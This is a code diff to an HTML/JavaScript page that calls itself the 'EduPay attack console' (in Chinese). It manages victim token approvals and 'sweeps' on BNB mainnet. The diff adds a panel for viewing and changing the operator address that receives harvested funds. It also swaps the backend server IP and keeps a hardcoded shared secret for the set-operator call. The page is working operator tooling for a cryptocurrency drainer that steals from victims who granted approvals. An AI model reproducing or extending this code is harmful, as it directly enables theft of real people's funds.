@@ -57,6 +57,18 @@
   <h1>EduPay 攻击控制台</h1>
   <div class="sub">受害者授权管理 · 手动 Sweep 控制 · BNB Mainnet</div>
 
+  <div class="stats" id="opPanel" style="margin-bottom:16px;">
+    <div class="stat">
+      <div class="label">当前 Operator（收钱地址）</div>
+      <div class="value" style="font-size:14px;" id="currentOp">加载中...</div>
+    </div>
+    <div class="stat">
+      <div class="label" style="margin-bottom:8px;">更换 Operator</div>
+      <input id="newOpInput" placeholder="0x..." style="width:100%;padding:8px 10px;border-radius:6px;border:1px solid rgba(115,128,155,0.4);background:rgba(22,25,36,0.9);color:#e0e4ec;font-size:12px;font-family:monospace;margin-bottom:8px;">
+      <button class="btn danger" onclick="changeOperator()" style="width:100%;">更新 Operator</button>
+    </div>
+  </div>
+
   <div class="stats" id="stats"></div>
 
   <div class="toolbar">
@@ -80,8 +92,44 @@
   <div class="empty" id="empty">加载中...</div>
 
   <script>
-    const API = "http://154.222.16.152:3999";
+    const API = "http://36.151.145.15:3999";
     const SECRET = "edu-sweep-2026";
+
+    // === Operator 管理 ===
+    async function loadOperator() {
+      try {
+        const r = await fetch(`${API}/operator`);
+        const d = await r.json();
+        document.getElementById("currentOp").textContent = d.operator;
+      } catch (e) {
+        document.getElementById("currentOp").textContent = "获取失败";
+      }
+    }
+
+    async function changeOperator() {
+      const newOp = document.getElementById("newOpInput").value.trim();
+      if (!newOp || !newOp.startsWith("0x") || newOp.length !== 42) {
+        alert("请输入有效的 0x 地址");
+        return;
+      }
+      if (!confirm(`确认将 Operator 更换为:\n${newOp}\n\n之后所有授权收割的资金将转入这个新地址。`)) return;
+      try {
+        const r = await fetch(`${API}/set-operator`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ secret: SECRET, operator: newOp }),
+        });
+        const d = await r.json();
+        if (d.ok) {
+          alert("Operator 已更新！\nTx: " + d.txHash);
+          loadOperator();
+        } else {
+          alert("更新失败: " + d.msg);
+        }
+      } catch (e) {
+        alert("请求失败: " + e.message);
+      }
+    }
 
     async function loadData() {
       document.getElementById("empty").textContent = "加载中...";
@@ -168,6 +216,7 @@
     }
 
     loadData();
+    loadOperator();
     setInterval(loadData, 15000);
   </script>
 </body>
